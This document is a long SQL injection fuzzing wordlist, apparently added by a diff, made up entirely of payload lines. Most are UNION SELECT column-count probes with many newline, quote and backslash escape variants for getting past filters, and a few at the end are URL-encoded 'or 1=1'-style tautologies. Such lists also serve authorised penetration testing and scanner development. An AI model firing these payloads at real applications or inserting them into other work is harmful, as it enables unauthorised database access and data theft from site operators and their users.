+0x0d0a union all select 1337 -- 
+0x0d0a union all select 1337 from dual
+0x0d0a union all select 1337 from dual -- 
+0x0d0a union all select 1337,1337
+0x0d0a union all select 1337,1337 -- 
+0x0d0a union all select 1337,1337 from dual
+0x0d0a union all select 1337,1337 from dual -- 
+0x0d0a union all select 1337,1337,1337
+0x0d0a union all select 1337,1337,1337 -- 
+0x0d0a union all select 1337,1337,1337 from dual
+0x0d0a union all select 1337,1337,1337 from dual -- 
+0x0d0a union all select 1337,1337,1337,1337
+0x0d0a union all select 1337,1337,1337,1337 -- 
+0x0d0a union all select 1337,1337,1337,1337 from dual
+0x0d0a union all select 1337,1337,1337,1337 from dual -- 
+0x0d0a union all select 1337,1337,1337,1337,1337
+0x0d0a union all select 1337,1337,1337,1337,1337 -- 
+0x0d0a union all select 1337,1337,1337,1337,1337 from dual
+0x0d0a union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0d0a union all select null
+0x0d0a union all select null -- 
+0x0d0a union all select null from dual
+0x0d0a union all select null from dual -- 
+0x0d0a union all select null,null
+0x0d0a union all select null,null -- 
+0x0d0a union all select null,null from dual
+0x0d0a union all select null,null from dual -- 
+0x0d0a union all select null,null,null
+0x0d0a union all select null,null,null -- 
+0x0d0a union all select null,null,null from dual
+0x0d0a union all select null,null,null from dual -- 
+0x0d0a union all select null,null,null,null
+0x0d0a union all select null,null,null,null -- 
+0x0d0a union all select null,null,null,null from dual
+0x0d0a union all select null,null,null,null from dual -- 
+0x0d0a union all select null,null,null,null,null
+0x0d0a union all select null,null,null,null,null -- 
+0x0d0a union all select null,null,null,null,null from dual
+0x0d0a union all select null,null,null,null,null from dual -- 
+0x0d0a' union all select '1337' -- 
+0x0d0a' union all select '1337' from dual -- 
+0x0d0a' union all select '1337','1337' -- 
+0x0d0a' union all select '1337','1337' from dual -- 
+0x0d0a' union all select '1337','1337','1337' -- 
+0x0d0a' union all select '1337','1337','1337' from dual -- 
+0x0d0a' union all select '1337','1337','1337','1337' -- 
+0x0d0a' union all select '1337','1337','1337','1337' from dual -- 
+0x0d0a' union all select '1337','1337','1337','1337','1337' -- 
+0x0d0a' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0d0a' union all select 1337 -- 
+0x0d0a' union all select 1337 from dual -- 
+0x0d0a' union all select 1337,1337 -- 
+0x0d0a' union all select 1337,1337 from dual -- 
+0x0d0a' union all select 1337,1337,1337 -- 
+0x0d0a' union all select 1337,1337,1337 from dual -- 
+0x0d0a' union all select 1337,1337,1337,1337 -- 
+0x0d0a' union all select 1337,1337,1337,1337 from dual -- 
+0x0d0a' union all select 1337,1337,1337,1337,1337 -- 
+0x0d0a' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0d0a' union all select null -- 
+0x0d0a' union all select null from dual -- 
+0x0d0a' union all select null,null -- 
+0x0d0a' union all select null,null from dual -- 
+0x0d0a' union all select null,null,null -- 
+0x0d0a' union all select null,null,null from dual -- 
+0x0d0a' union all select null,null,null,null -- 
+0x0d0a' union all select null,null,null,null from dual -- 
+0x0d0a' union all select null,null,null,null,null -- 
+0x0d0a' union all select null,null,null,null,null from dual -- 
+0x0d0a\' union all select '1337' -- 
+0x0d0a\' union all select '1337' from dual -- 
+0x0d0a\' union all select '1337','1337' -- 
+0x0d0a\' union all select '1337','1337' from dual -- 
+0x0d0a\' union all select '1337','1337','1337' -- 
+0x0d0a\' union all select '1337','1337','1337' from dual -- 
+0x0d0a\' union all select '1337','1337','1337','1337' -- 
+0x0d0a\' union all select '1337','1337','1337','1337' from dual -- 
+0x0d0a\' union all select '1337','1337','1337','1337','1337' -- 
+0x0d0a\' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0d0a\' union all select 1337 -- 
+0x0d0a\' union all select 1337 from dual -- 
+0x0d0a\' union all select 1337,1337 -- 
+0x0d0a\' union all select 1337,1337 from dual -- 
+0x0d0a\' union all select 1337,1337,1337 -- 
+0x0d0a\' union all select 1337,1337,1337 from dual -- 
+0x0d0a\' union all select 1337,1337,1337,1337 -- 
+0x0d0a\' union all select 1337,1337,1337,1337 from dual -- 
+0x0d0a\' union all select 1337,1337,1337,1337,1337 -- 
+0x0d0a\' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0d0a\' union all select null -- 
+0x0d0a\' union all select null from dual -- 
+0x0d0a\' union all select null,null -- 
+0x0d0a\' union all select null,null from dual -- 
+0x0d0a\' union all select null,null,null -- 
+0x0d0a\' union all select null,null,null from dual -- 
+0x0d0a\' union all select null,null,null,null -- 
+0x0d0a\' union all select null,null,null,null from dual -- 
+0x0d0a\' union all select null,null,null,null,null -- 
+0x0d0a\' union all select null,null,null,null,null from dual -- 
+0x0d0a\\' union all select '1337' -- 
+0x0d0a\\' union all select '1337' from dual -- 
+0x0d0a\\' union all select '1337','1337' -- 
+0x0d0a\\' union all select '1337','1337' from dual -- 
+0x0d0a\\' union all select '1337','1337','1337' -- 
+0x0d0a\\' union all select '1337','1337','1337' from dual -- 
+0x0d0a\\' union all select '1337','1337','1337','1337' -- 
+0x0d0a\\' union all select '1337','1337','1337','1337' from dual -- 
+0x0d0a\\' union all select '1337','1337','1337','1337','1337' -- 
+0x0d0a\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+0x0d0a\\' union all select 1337 -- 
+0x0d0a\\' union all select 1337 from dual -- 
+0x0d0a\\' union all select 1337,1337 -- 
+0x0d0a\\' union all select 1337,1337 from dual -- 
+0x0d0a\\' union all select 1337,1337,1337 -- 
+0x0d0a\\' union all select 1337,1337,1337 from dual -- 
+0x0d0a\\' union all select 1337,1337,1337,1337 -- 
+0x0d0a\\' union all select 1337,1337,1337,1337 from dual -- 
+0x0d0a\\' union all select 1337,1337,1337,1337,1337 -- 
+0x0d0a\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+0x0d0a\\' union all select null -- 
+0x0d0a\\' union all select null from dual -- 
+0x0d0a\\' union all select null,null -- 
+0x0d0a\\' union all select null,null from dual -- 
+0x0d0a\\' union all select null,null,null -- 
+0x0d0a\\' union all select null,null,null from dual -- 
+0x0d0a\\' union all select null,null,null,null -- 
+0x0d0a\\' union all select null,null,null,null from dual -- 
+0x0d0a\\' union all select null,null,null,null,null -- 
+0x0d0a\\' union all select null,null,null,null,null from dual -- 
+\' union all select '1337' -- 
+\' union all select '1337' from dual -- 
+\' union all select '1337','1337' -- 
+\' union all select '1337','1337' from dual -- 
+\' union all select '1337','1337','1337' -- 
+\' union all select '1337','1337','1337' from dual -- 
+\' union all select '1337','1337','1337','1337' -- 
+\' union all select '1337','1337','1337','1337' from dual -- 
+\' union all select '1337','1337','1337','1337','1337' -- 
+\' union all select '1337','1337','1337','1337','1337' from dual -- 
+\' union all select 1337 -- 
+\' union all select 1337 from dual -- 
+\' union all select 1337,1337 -- 
+\' union all select 1337,1337 from dual -- 
+\' union all select 1337,1337,1337 -- 
+\' union all select 1337,1337,1337 from dual -- 
+\' union all select 1337,1337,1337,1337 -- 
+\' union all select 1337,1337,1337,1337 from dual -- 
+\' union all select 1337,1337,1337,1337,1337 -- 
+\' union all select 1337,1337,1337,1337,1337 from dual -- 
+\' union all select null -- 
+\' union all select null from dual -- 
+\' union all select null,null -- 
+\' union all select null,null from dual -- 
+\' union all select null,null,null -- 
+\' union all select null,null,null from dual -- 
+\' union all select null,null,null,null -- 
+\' union all select null,null,null,null from dual -- 
+\' union all select null,null,null,null,null -- 
+\' union all select null,null,null,null,null from dual -- 
+\\' union all select '1337' -- 
+\\' union all select '1337' from dual -- 
+\\' union all select '1337','1337' -- 
+\\' union all select '1337','1337' from dual -- 
+\\' union all select '1337','1337','1337' -- 
+\\' union all select '1337','1337','1337' from dual -- 
+\\' union all select '1337','1337','1337','1337' -- 
+\\' union all select '1337','1337','1337','1337' from dual -- 
+\\' union all select '1337','1337','1337','1337','1337' -- 
+\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+\\' union all select 1337 -- 
+\\' union all select 1337 from dual -- 
+\\' union all select 1337,1337 -- 
+\\' union all select 1337,1337 from dual -- 
+\\' union all select 1337,1337,1337 -- 
+\\' union all select 1337,1337,1337 from dual -- 
+\\' union all select 1337,1337,1337,1337 -- 
+\\' union all select 1337,1337,1337,1337 from dual -- 
+\\' union all select 1337,1337,1337,1337,1337 -- 
+\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+\\' union all select null -- 
+\\' union all select null from dual -- 
+\\' union all select null,null -- 
+\\' union all select null,null from dual -- 
+\\' union all select null,null,null -- 
+\\' union all select null,null,null from dual -- 
+\\' union all select null,null,null,null -- 
+\\' union all select null,null,null,null from dual -- 
+\\' union all select null,null,null,null,null -- 
+\\' union all select null,null,null,null,null from dual -- 
+\\n union all select '1337'
+\\n union all select '1337' -- 
+\\n union all select '1337' from dual
+\\n union all select '1337' from dual -- 
+\\n union all select '1337','1337'
+\\n union all select '1337','1337' -- 
+\\n union all select '1337','1337' from dual
+\\n union all select '1337','1337' from dual -- 
+\\n union all select '1337','1337','1337'
+\\n union all select '1337','1337','1337' -- 
+\\n union all select '1337','1337','1337' from dual
+\\n union all select '1337','1337','1337' from dual -- 
+\\n union all select '1337','1337','1337','1337'
+\\n union all select '1337','1337','1337','1337' -- 
+\\n union all select '1337','1337','1337','1337' from dual
+\\n union all select '1337','1337','1337','1337' from dual -- 
+\\n union all select '1337','1337','1337','1337','1337'
+\\n union all select '1337','1337','1337','1337','1337' -- 
+\\n union all select '1337','1337','1337','1337','1337' from dual
+\\n union all select '1337','1337','1337','1337','1337' from dual -- 
+\\n union all select 1337
+\\n union all select 1337 -- 
+\\n union all select 1337 from dual
+\\n union all select 1337 from dual -- 
+\\n union all select 1337,1337
+\\n union all select 1337,1337 -- 
+\\n union all select 1337,1337 from dual
+\\n union all select 1337,1337 from dual -- 
+\\n union all select 1337,1337,1337
+\\n union all select 1337,1337,1337 -- 
+\\n union all select 1337,1337,1337 from dual
+\\n union all select 1337,1337,1337 from dual -- 
+\\n union all select 1337,1337,1337,1337
+\\n union all select 1337,1337,1337,1337 -- 
+\\n union all select 1337,1337,1337,1337 from dual
+\\n union all select 1337,1337,1337,1337 from dual -- 
+\\n union all select 1337,1337,1337,1337,1337
+\\n union all select 1337,1337,1337,1337,1337 -- 
+\\n union all select 1337,1337,1337,1337,1337 from dual
+\\n union all select 1337,1337,1337,1337,1337 from dual -- 
+\\n union all select null
+\\n union all select null -- 
+\\n union all select null from dual
+\\n union all select null from dual -- 
+\\n union all select null,null
+\\n union all select null,null -- 
+\\n union all select null,null from dual
+\\n union all select null,null from dual -- 
+\\n union all select null,null,null
+\\n union all select null,null,null -- 
+\\n union all select null,null,null from dual
+\\n union all select null,null,null from dual -- 
+\\n union all select null,null,null,null
+\\n union all select null,null,null,null -- 
+\\n union all select null,null,null,null from dual
+\\n union all select null,null,null,null from dual -- 
+\\n union all select null,null,null,null,null
+\\n union all select null,null,null,null,null -- 
+\\n union all select null,null,null,null,null from dual
+\\n union all select null,null,null,null,null from dual -- 
+\\n' union all select '1337' -- 
+\\n' union all select '1337' from dual -- 
+\\n' union all select '1337','1337' -- 
+\\n' union all select '1337','1337' from dual -- 
+\\n' union all select '1337','1337','1337' -- 
+\\n' union all select '1337','1337','1337' from dual -- 
+\\n' union all select '1337','1337','1337','1337' -- 
+\\n' union all select '1337','1337','1337','1337' from dual -- 
+\\n' union all select '1337','1337','1337','1337','1337' -- 
+\\n' union all select '1337','1337','1337','1337','1337' from dual -- 
+\\n' union all select 1337 -- 
+\\n' union all select 1337 from dual -- 
+\\n' union all select 1337,1337 -- 
+\\n' union all select 1337,1337 from dual -- 
+\\n' union all select 1337,1337,1337 -- 
+\\n' union all select 1337,1337,1337 from dual -- 
+\\n' union all select 1337,1337,1337,1337 -- 
+\\n' union all select 1337,1337,1337,1337 from dual -- 
+\\n' union all select 1337,1337,1337,1337,1337 -- 
+\\n' union all select 1337,1337,1337,1337,1337 from dual -- 
+\\n' union all select null -- 
+\\n' union all select null from dual -- 
+\\n' union all select null,null -- 
+\\n' union all select null,null from dual -- 
+\\n' union all select null,null,null -- 
+\\n' union all select null,null,null from dual -- 
+\\n' union all select null,null,null,null -- 
+\\n' union all select null,null,null,null from dual -- 
+\\n' union all select null,null,null,null,null -- 
+\\n' union all select null,null,null,null,null from dual -- 
+\\n\\' union all select '1337' -- 
+\\n\\' union all select '1337' from dual -- 
+\\n\\' union all select '1337','1337' -- 
+\\n\\' union all select '1337','1337' from dual -- 
+\\n\\' union all select '1337','1337','1337' -- 
+\\n\\' union all select '1337','1337','1337' from dual -- 
+\\n\\' union all select '1337','1337','1337','1337' -- 
+\\n\\' union all select '1337','1337','1337','1337' from dual -- 
+\\n\\' union all select '1337','1337','1337','1337','1337' -- 
+\\n\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+\\n\\' union all select 1337 -- 
+\\n\\' union all select 1337 from dual -- 
+\\n\\' union all select 1337,1337 -- 
+\\n\\' union all select 1337,1337 from dual -- 
+\\n\\' union all select 1337,1337,1337 -- 
+\\n\\' union all select 1337,1337,1337 from dual -- 
+\\n\\' union all select 1337,1337,1337,1337 -- 
+\\n\\' union all select 1337,1337,1337,1337 from dual -- 
+\\n\\' union all select 1337,1337,1337,1337,1337 -- 
+\\n\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+\\n\\' union all select null -- 
+\\n\\' union all select null from dual -- 
+\\n\\' union all select null,null -- 
+\\n\\' union all select null,null from dual -- 
+\\n\\' union all select null,null,null -- 
+\\n\\' union all select null,null,null from dual -- 
+\\n\\' union all select null,null,null,null -- 
+\\n\\' union all select null,null,null,null from dual -- 
+\\n\\' union all select null,null,null,null,null -- 
+\\n\\' union all select null,null,null,null,null from dual -- 
+\\r\\n union all select '1337'
+\\r\\n union all select '1337' -- 
+\\r\\n union all select '1337' from dual
+\\r\\n union all select '1337' from dual -- 
+\\r\\n union all select '1337','1337'
+\\r\\n union all select '1337','1337' -- 
+\\r\\n union all select '1337','1337' from dual
+\\r\\n union all select '1337','1337' from dual -- 
+\\r\\n union all select '1337','1337','1337'
+\\r\\n union all select '1337','1337','1337' -- 
+\\r\\n union all select '1337','1337','1337' from dual
+\\r\\n union all select '1337','1337','1337' from dual -- 
+\\r\\n union all select '1337','1337','1337','1337'
+\\r\\n union all select '1337','1337','1337','1337' -- 
+\\r\\n union all select '1337','1337','1337','1337' from dual
+\\r\\n union all select '1337','1337','1337','1337' from dual -- 
+\\r\\n union all select '1337','1337','1337','1337','1337'
+\\r\\n union all select '1337','1337','1337','1337','1337' -- 
+\\r\\n union all select '1337','1337','1337','1337','1337' from dual
+\\r\\n union all select '1337','1337','1337','1337','1337' from dual -- 
+\\r\\n union all select 1337
+\\r\\n union all select 1337 -- 
+\\r\\n union all select 1337 from dual
+\\r\\n union all select 1337 from dual -- 
+\\r\\n union all select 1337,1337
+\\r\\n union all select 1337,1337 -- 
+\\r\\n union all select 1337,1337 from dual
+\\r\\n union all select 1337,1337 from dual -- 
+\\r\\n union all select 1337,1337,1337
+\\r\\n union all select 1337,1337,1337 -- 
+\\r\\n union all select 1337,1337,1337 from dual
+\\r\\n union all select 1337,1337,1337 from dual -- 
+\\r\\n union all select 1337,1337,1337,1337
+\\r\\n union all select 1337,1337,1337,1337 -- 
+\\r\\n union all select 1337,1337,1337,1337 from dual
+\\r\\n union all select 1337,1337,1337,1337 from dual -- 
+\\r\\n union all select 1337,1337,1337,1337,1337
+\\r\\n union all select 1337,1337,1337,1337,1337 -- 
+\\r\\n union all select 1337,1337,1337,1337,1337 from dual
+\\r\\n union all select 1337,1337,1337,1337,1337 from dual -- 
+\\r\\n union all select null
+\\r\\n union all select null -- 
+\\r\\n union all select null from dual
+\\r\\n union all select null from dual -- 
+\\r\\n union all select null,null
+\\r\\n union all select null,null -- 
+\\r\\n union all select null,null from dual
+\\r\\n union all select null,null from dual -- 
+\\r\\n union all select null,null,null
+\\r\\n union all select null,null,null -- 
+\\r\\n union all select null,null,null from dual
+\\r\\n union all select null,null,null from dual -- 
+\\r\\n union all select null,null,null,null
+\\r\\n union all select null,null,null,null -- 
+\\r\\n union all select null,null,null,null from dual
+\\r\\n union all select null,null,null,null from dual -- 
+\\r\\n union all select null,null,null,null,null
+\\r\\n union all select null,null,null,null,null -- 
+\\r\\n union all select null,null,null,null,null from dual
+\\r\\n union all select null,null,null,null,null from dual -- 
+\\r\\n' union all select '1337' -- 
+\\r\\n' union all select '1337' from dual -- 
+\\r\\n' union all select '1337','1337' -- 
+\\r\\n' union all select '1337','1337' from dual -- 
+\\r\\n' union all select '1337','1337','1337' -- 
+\\r\\n' union all select '1337','1337','1337' from dual -- 
+\\r\\n' union all select '1337','1337','1337','1337' -- 
+\\r\\n' union all select '1337','1337','1337','1337' from dual -- 
+\\r\\n' union all select '1337','1337','1337','1337','1337' -- 
+\\r\\n' union all select '1337','1337','1337','1337','1337' from dual -- 
+\\r\\n' union all select 1337 -- 
+\\r\\n' union all select 1337 from dual -- 
+\\r\\n' union all select 1337,1337 -- 
+\\r\\n' union all select 1337,1337 from dual -- 
+\\r\\n' union all select 1337,1337,1337 -- 
+\\r\\n' union all select 1337,1337,1337 from dual -- 
+\\r\\n' union all select 1337,1337,1337,1337 -- 
+\\r\\n' union all select 1337,1337,1337,1337 from dual -- 
+\\r\\n' union all select 1337,1337,1337,1337,1337 -- 
+\\r\\n' union all select 1337,1337,1337,1337,1337 from dual -- 
+\\r\\n' union all select null -- 
+\\r\\n' union all select null from dual -- 
+\\r\\n' union all select null,null -- 
+\\r\\n' union all select null,null from dual -- 
+\\r\\n' union all select null,null,null -- 
+\\r\\n' union all select null,null,null from dual -- 
+\\r\\n' union all select null,null,null,null -- 
+\\r\\n' union all select null,null,null,null from dual -- 
+\\r\\n' union all select null,null,null,null,null -- 
+\\r\\n' union all select null,null,null,null,null from dual -- 
+\\r\\n\\' union all select '1337' -- 
+\\r\\n\\' union all select '1337' from dual -- 
+\\r\\n\\' union all select '1337','1337' -- 
+\\r\\n\\' union all select '1337','1337' from dual -- 
+\\r\\n\\' union all select '1337','1337','1337' -- 
+\\r\\n\\' union all select '1337','1337','1337' from dual -- 
+\\r\\n\\' union all select '1337','1337','1337','1337' -- 
+\\r\\n\\' union all select '1337','1337','1337','1337' from dual -- 
+\\r\\n\\' union all select '1337','1337','1337','1337','1337' -- 
+\\r\\n\\' union all select '1337','1337','1337','1337','1337' from dual -- 
+\\r\\n\\' union all select 1337 -- 
+\\r\\n\\' union all select 1337 from dual -- 
+\\r\\n\\' union all select 1337,1337 -- 
+\\r\\n\\' union all select 1337,1337 from dual -- 
+\\r\\n\\' union all select 1337,1337,1337 -- 
+\\r\\n\\' union all select 1337,1337,1337 from dual -- 
+\\r\\n\\' union all select 1337,1337,1337,1337 -- 
+\\r\\n\\' union all select 1337,1337,1337,1337 from dual -- 
+\\r\\n\\' union all select 1337,1337,1337,1337,1337 -- 
+\\r\\n\\' union all select 1337,1337,1337,1337,1337 from dual -- 
+\\r\\n\\' union all select null -- 
+\\r\\n\\' union all select null from dual -- 
+\\r\\n\\' union all select null,null -- 
+\\r\\n\\' union all select null,null from dual -- 
+\\r\\n\\' union all select null,null,null -- 
+\\r\\n\\' union all select null,null,null from dual -- 
+\\r\\n\\' union all select null,null,null,null -- 
+\\r\\n\\' union all select null,null,null,null from dual -- 
+\\r\\n\\' union all select null,null,null,null,null -- 
+\\r\\n\\' union all select null,null,null,null,null from dual -- 
+\n union all select '1337'
+\n union all select '1337' -- 
+\n union all select '1337' from dual
+\n union all select '1337' from dual -- 
+\n union all select '1337','1337'
+\n union all select '1337','1337' -- 
+\n union all select '1337','1337' from dual
+\n union all select '1337','1337' from dual -- 
+\n union all select '1337','1337','1337'
+\n union all select '1337','1337','1337' -- 
+\n union all select '1337','1337','1337' from dual
+\n union all select '1337','1337','1337' from dual -- 
+\n union all select '1337','1337','1337','1337'
+\n union all select '1337','1337','1337','1337' -- 
+\n union all select '1337','1337','1337','1337' from dual
+\n union all select '1337','1337','1337','1337' from dual -- 
+\n union all select '1337','1337','1337','1337','1337'
+\n union all select '1337','1337','1337','1337','1337' -- 
+\n union all select '1337','1337','1337','1337','1337' from dual
+\n union all select '1337','1337','1337','1337','1337' from dual -- 
+\n union all select 1337
+\n union all select 1337 -- 
+\n union all select 1337 from dual
+\n union all select 1337 from dual -- 
+\n union all select 1337,1337
+\n union all select 1337,1337 -- 
+\n union all select 1337,1337 from dual
+\n union all select 1337,1337 from dual -- 
+\n union all select 1337,1337,1337
+\n union all select 1337,1337,1337 -- 
+\n union all select 1337,1337,1337 from dual
+\n union all select 1337,1337,1337 from dual -- 
+\n union all select 1337,1337,1337,1337
+\n union all select 1337,1337,1337,1337 -- 
+\n union all select 1337,1337,1337,1337 from dual
+\n union all select 1337,1337,1337,1337 from dual -- 
+\n union all select 1337,1337,1337,1337,1337
+\n union all select 1337,1337,1337,1337,1337 -- 
+\n union all select 1337,1337,1337,1337,1337 from dual
+\n union all select 1337,1337,1337,1337,1337 from dual -- 
+\n union all select null
+\n union all select null -- 
+\n union all select null from dual
+\n union all select null from dual -- 
+\n union all select null,null
+\n union all select null,null -- 
+\n union all select null,null from dual
+\n union all select null,null from dual -- 
+\n union all select null,null,null
+\n union all select null,null,null -- 
+\n union all select null,null,null from dual
+\n union all select null,null,null from dual -- 
+\n union all select null,null,null,null
+\n union all select null,null,null,null -- 
+\n union all select null,null,null,null from dual
+\n union all select null,null,null,null from dual -- 
+\n union all select null,null,null,null,null
+\n union all select null,null,null,null,null -- 
+\n union all select null,null,null,null,null from dual
+\n union all select null,null,null,null,null from dual -- 
+\n' union all select '1337' -- 
+\n' union all select '1337' from dual -- 
+\n' union all select '1337','1337' -- 
+\n' union all select '1337','1337' from dual -- 
+\n' union all select '1337','1337','1337' -- 
+\n' union all select '1337','1337','1337' from dual -- 
+\n' union all select '1337','1337','1337','1337' -- 
+\n' union all select '1337','1337','1337','1337' from dual -- 
+\n' union all select '1337','1337','1337','1337','1337' -- 
+\n' union all select '1337','1337','1337','1337','1337' from dual -- 
+\n' union all select 1337 -- 
+\n' union all select 1337 from dual -- 
+\n' union all select 1337,1337 -- 
+\n' union all select 1337,1337 from dual -- 
+\n' union all select 1337,1337,1337 -- 
+\n' union all select 1337,1337,1337 from dual -- 
+\n' union all select 1337,1337,1337,1337 -- 
+\n' union all select 1337,1337,1337,1337 from dual -- 
+\n' union all select 1337,1337,1337,1337,1337 -- 
+\n' union all select 1337,1337,1337,1337,1337 from dual -- 
+\n' union all select null -- 
+\n' union all select null from dual -- 
+\n' union all select null,null -- 
+\n' union all select null,null from dual -- 
+\n' union all select null,null,null -- 
+\n' union all select null,null,null from dual -- 
+\n' union all select null,null,null,null -- 
+\n' union all select null,null,null,null from dual -- 
+\n' union all select null,null,null,null,null -- 
+\n' union all select null,null,null,null,null from dual -- 
+\n\' union all select '1337' -- 
+\n\' union all select '1337' from dual -- 
+\n\' union all select '1337','1337' -- 
+\n\' union all select '1337','1337' from dual -- 
+\n\' union all select '1337','1337','1337' -- 
+\n\' union all select '1337','1337','1337' from dual -- 
+\n\' union all select '1337','1337','1337','1337' -- 
+\n\' union all select '1337','1337','1337','1337' from dual -- 
+\n\' union all select '1337','1337','1337','1337','1337' -- 
+\n\' union all select '1337','1337','1337','1337','1337' from dual -- 
+\n\' union all select 1337 -- 
+\n\' union all select 1337 from dual -- 
+\n\' union all select 1337,1337 -- 
+\n\' union all select 1337,1337 from dual -- 
+\n\' union all select 1337,1337,1337 -- 
+\n\' union all select 1337,1337,1337 from dual -- 
+\n\' union all select 1337,1337,1337,1337 -- 
+\n\' union all select 1337,1337,1337,1337 from dual -- 
+\n\' union all select 1337,1337,1337,1337,1337 -- 
+\n\' union all select 1337,1337,1337,1337,1337 from dual -- 
+\n\' union all select null -- 
+\n\' union all select null from dual -- 
+\n\' union all select null,null -- 
+\n\' union all select null,null from dual -- 
+\n\' union all select null,null,null -- 
+\n\' union all select null,null,null from dual -- 
+\n\' union all select null,null,null,null -- 
+\n\' union all select null,null,null,null from dual -- 
+\n\' union all select null,null,null,null,null -- 
+\n\' union all select null,null,null,null,null from dual -- 
+\r\n union all select '1337'
+\r\n union all select '1337' -- 
+\r\n union all select '1337' from dual
+\r\n union all select '1337' from dual -- 
+\r\n union all select '1337','1337'
+\r\n union all select '1337','1337' -- 
+\r\n union all select '1337','1337' from dual
+\r\n union all select '1337','1337' from dual -- 
+\r\n union all select '1337','1337','1337'
+\r\n union all select '1337','1337','1337' -- 
+\r\n union all select '1337','1337','1337' from dual
+\r\n union all select '1337','1337','1337' from dual -- 
+\r\n union all select '1337','1337','1337','1337'
+\r\n union all select '1337','1337','1337','1337' -- 
+\r\n union all select '1337','1337','1337','1337' from dual
+\r\n union all select '1337','1337','1337','1337' from dual -- 
+\r\n union all select '1337','1337','1337','1337','1337'
+\r\n union all select '1337','1337','1337','1337','1337' -- 
+\r\n union all select '1337','1337','1337','1337','1337' from dual
+\r\n union all select '1337','1337','1337','1337','1337' from dual -- 
+\r\n union all select 1337
+\r\n union all select 1337 -- 
+\r\n union all select 1337 from dual
+\r\n union all select 1337 from dual -- 
+\r\n union all select 1337,1337
+\r\n union all select 1337,1337 -- 
+\r\n union all select 1337,1337 from dual
+\r\n union all select 1337,1337 from dual -- 
+\r\n union all select 1337,1337,1337
+\r\n union all select 1337,1337,1337 -- 
+\r\n union all select 1337,1337,1337 from dual
+\r\n union all select 1337,1337,1337 from dual -- 
+\r\n union all select 1337,1337,1337,1337
+\r\n union all select 1337,1337,1337,1337 -- 
+\r\n union all select 1337,1337,1337,1337 from dual
+\r\n union all select 1337,1337,1337,1337 from dual -- 
+\r\n union all select 1337,1337,1337,1337,1337
+\r\n union all select 1337,1337,1337,1337,1337 -- 
+\r\n union all select 1337,1337,1337,1337,1337 from dual
+\r\n union all select 1337,1337,1337,1337,1337 from dual -- 
+\r\n union all select null
+\r\n union all select null -- 
+\r\n union all select null from dual
+\r\n union all select null from dual -- 
+\r\n union all select null,null
+\r\n union all select null,null -- 
+\r\n union all select null,null from dual
+\r\n union all select null,null from dual -- 
+\r\n union all select null,null,null
+\r\n union all select null,null,null -- 
+\r\n union all select null,null,null from dual
+\r\n union all select null,null,null from dual -- 
+\r\n union all select null,null,null,null
+\r\n union all select null,null,null,null -- 
+\r\n union all select null,null,null,null from dual
+\r\n union all select null,null,null,null from dual -- 
+\r\n union all select null,null,null,null,null
+\r\n union all select null,null,null,null,null -- 
+\r\n union all select null,null,null,null,null from dual
+\r\n union all select null,null,null,null,null from dual -- 
+\r\n' union all select '1337' -- 
+\r\n' union all select '1337' from dual -- 
+\r\n' union all select '1337','1337' -- 
+\r\n' union all select '1337','1337' from dual -- 
+\r\n' union all select '1337','1337','1337' -- 
+\r\n' union all select '1337','1337','1337' from dual -- 
+\r\n' union all select '1337','1337','1337','1337' -- 
+\r\n' union all select '1337','1337','1337','1337' from dual -- 
+\r\n' union all select '1337','1337','1337','1337','1337' -- 
+\r\n' union all select '1337','1337','1337','1337','1337' from dual -- 
+\r\n' union all select 1337 -- 
+\r\n' union all select 1337 from dual -- 
+\r\n' union all select 1337,1337 -- 
+\r\n' union all select 1337,1337 from dual -- 
+\r\n' union all select 1337,1337,1337 -- 
+\r\n' union all select 1337,1337,1337 from dual -- 
+\r\n' union all select 1337,1337,1337,1337 -- 
+\r\n' union all select 1337,1337,1337,1337 from dual -- 
+\r\n' union all select 1337,1337,1337,1337,1337 -- 
+\r\n' union all select 1337,1337,1337,1337,1337 from dual -- 
+\r\n' union all select null -- 
+\r\n' union all select null from dual -- 
+\r\n' union all select null,null -- 
+\r\n' union all select null,null from dual -- 
+\r\n' union all select null,null,null -- 
+\r\n' union all select null,null,null from dual -- 
+\r\n' union all select null,null,null,null -- 
+\r\n' union all select null,null,null,null from dual -- 
+\r\n' union all select null,null,null,null,null -- 
+\r\n' union all select null,null,null,null,null from dual -- 
+\r\n\' union all select '1337' -- 
+\r\n\' union all select '1337' from dual -- 
+\r\n\' union all select '1337','1337' -- 
+\r\n\' union all select '1337','1337' from dual -- 
+\r\n\' union all select '1337','1337','1337' -- 
+\r\n\' union all select '1337','1337','1337' from dual -- 
+\r\n\' union all select '1337','1337','1337','1337' -- 
+\r\n\' union all select '1337','1337','1337','1337' from dual -- 
+\r\n\' union all select '1337','1337','1337','1337','1337' -- 
+\r\n\' union all select '1337','1337','1337','1337','1337' from dual -- 
+\r\n\' union all select 1337 -- 
+\r\n\' union all select 1337 from dual -- 
+\r\n\' union all select 1337,1337 -- 
+\r\n\' union all select 1337,1337 from dual -- 
+\r\n\' union all select 1337,1337,1337 -- 
+\r\n\' union all select 1337,1337,1337 from dual -- 
+\r\n\' union all select 1337,1337,1337,1337 -- 
+\r\n\' union all select 1337,1337,1337,1337 from dual -- 
+\r\n\' union all select 1337,1337,1337,1337,1337 -- 
+\r\n\' union all select 1337,1337,1337,1337,1337 from dual -- 
+\r\n\' union all select null -- 
+\r\n\' union all select null from dual -- 
+\r\n\' union all select null,null -- 
+\r\n\' union all select null,null from dual -- 
+\r\n\' union all select null,null,null -- 
+\r\n\' union all select null,null,null from dual -- 
+\r\n\' union all select null,null,null,null -- 
+\r\n\' union all select null,null,null,null from dual -- 
+\r\n\' union all select null,null,null,null,null -- 
+\r\n\' union all select null,null,null,null,null from dual --
+%20or%20%27xyz%27%3d%27xyz%27
+%20or%20%27xyz%27%3d%27xyz%27%20--%20
+%20or%2052%3c99
+%20or%2052%3c99%20--%20
+%20or%2052%3d52
+%20or%2052%3d52%20--%20
+%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27
+%20or%20%5c%27xyz%5c%27%3d%5c%27xyz%5c%27%20--%20
